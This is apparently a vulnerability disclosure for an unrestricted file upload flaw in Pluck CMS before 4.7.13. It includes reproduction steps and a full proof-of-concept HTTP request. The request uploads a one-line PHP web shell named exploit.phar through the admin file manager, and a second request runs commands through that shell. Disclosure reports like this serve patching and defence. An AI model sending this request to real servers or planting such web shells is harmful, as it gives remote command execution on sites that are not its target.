# Vulnerability Type

Unrestricted File Upload

# Description

A file upload restriction bypass vulnerability in Pluck CMS before 4.7.13 allows an admin privileged user to gain access in the host through the "manage files" functionality, which may result in remote code execution.

# PoC Report

 ## Environment Setup

 - Software Link: https://github.com/pluck-cms/pluck/
 - Version: 4.7.11
 - Tested on: Windows 10

 ## Exploit Description

The file validation mechanism is incomplete, allowing `.phar` file uploads when the `action` and `submit` parameters meet specific path constraints.

 ## Steps to Reproduce

  1. Log in as an admin user.
  2. Intercept and send the malicious request using a web proxy tool such as Burp Suite, ensure it includes a valid session cookie.
  3. The file will be uploaded and can be accessed through the url.

 ## Proof Of Concept
```
POST /admin.php?action=files HTTP/1.1
Host: pluck
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123
Cookie: PHPSESSID=<valid_admin_session>; <token_name>=pluck_loggedin

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="filefile"; filename="exploit.phar"
Content-Type: application/x-php

<?php system($_GET['cmd']); ?>
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="submit"

1
------WebKitFormBoundaryABC123--

# Access uploaded shell via:
GET /files/exploit.phar?cmd=id HTTP/1.1
Host: pluck

# Required preconditions:
1. Attacker must possess valid admin session cookies
2. Server must have phar extension enabled (default in PHP <5.3.0)
3. File must retain .phar extension after upload (no .txt appending)
```

